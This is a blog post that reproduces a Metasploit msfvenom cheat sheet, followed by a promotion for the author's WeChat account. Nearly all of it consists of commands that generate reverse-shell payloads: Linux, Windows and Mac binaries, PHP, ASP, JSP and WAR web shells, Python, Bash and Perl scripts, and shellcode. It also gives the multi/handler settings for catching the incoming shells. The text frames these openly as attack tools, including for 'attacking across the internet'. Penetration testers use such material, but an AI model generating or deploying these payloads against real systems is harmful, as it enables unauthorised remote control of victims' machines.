---
layout: post
category: binghe-code-hack
title: Msfvenom生成各类Payload命令
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Msfvenom生成各类Payload命令
lock: need
---

# Msfvenom生成各类Payload命令

Often one of the most useful (and to the beginner underrated)  abilities of Metasploit is the msfpayload module. Multiple payloads can  be created with this module and it helps something that can give you a  shell in almost any situation. For each of these payloads you can go  into msfconsole and select exploit/multi/handler. Run ‘set payload’ for  the relevant payload used and configure all necessary options (LHOST,  LPORT, etc). Execute and wait for the payload to be run. For the  examples below it’s pretty self explanatory but LHOST should be filled  in with your IP address (LAN IP if attacking within the network, WAN IP  if attacking across the internet), and LPORT should be the port you wish to be connected back on.

List payloads

```
msfvenom -l
```

Binaries

**Linux** 

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

**Windows** 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

**Mac** 

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

Web Payloads

**PHP** 

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php



cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

**ASP** 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

**JSP** 

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

**WAR** 

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

Scripting Payloads

**Python** 

```
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

**Bash** 

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

**Perl** 

```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

Shellcode

For all shellcode see ‘msfvenom –help-formats’ for information as to  valid parameters. Msfvenom will output code that is able to be cut and  pasted in this language for your exploits.

**Linux Based Shellcode** 

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

**Windows Based Shellcode** 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

**Mac Based Shellcode** 

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Handlers

Metasploit handlers can be great at quickly setting up Metasploit to  be in a position to receive your incoming shells. Handlers should be in  the following format.

```
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)